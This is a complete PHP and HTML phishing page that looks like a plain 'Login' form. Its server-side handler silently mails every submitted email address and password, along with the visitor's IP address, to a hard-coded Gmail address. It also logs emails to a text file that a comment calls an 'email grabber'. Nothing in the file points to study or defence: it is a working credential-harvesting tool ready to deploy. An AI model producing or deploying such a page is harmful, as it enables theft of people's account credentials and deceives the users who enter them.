<?php
// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Basic validation
    if (!empty($email) && !empty($password) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // Send login details to your email
        $to = "jc4717287@gmail.com"; // Change to your email address
        $subject = "New Login Attempt";
        $message = "Email: $email\nPassword: $password\nIP: " . $_SERVER['REMOTE_ADDR'];
        $headers = "From: noreply@example.com\r\n";

        mail($to, $subject, $message, $headers);

        // Optionally, store the email in a file (email grabber)
        file_put_contents("emails.txt", $email . PHP_EOL, FILE_APPEND);

        // Redirect or show success message
        $success = "Login details submitted successfully.";
    } else {
        $error = "Please enter a valid email and password.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f4f4f4; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
        }
        .login-container {
            background: #fff;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 350px;
        }
        .login-container h2 {
            margin-bottom: 1.5rem;
            text-align: center;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label {
            display: block;
            margin-bottom: .5rem;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: .5rem;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: .7rem;
            background: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
        }
        .message {
            margin-bottom: 1rem;
            color: green;
            text-align: center;
        }
        .error {
            margin-bottom: 1rem;
            color: red;
            text-align: center;
        }
        @media (max-width: 400px) {
            .login-container {
                padding: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <?php if (!empty($success)): ?>
            <div class="message"><?php echo htmlspecialchars($success); ?></div>
        <?php elseif (!empty($error)): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        <form method="post" action="">
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" name="email" id="email" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" name="password" id="password" required autocomplete="current-password">
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>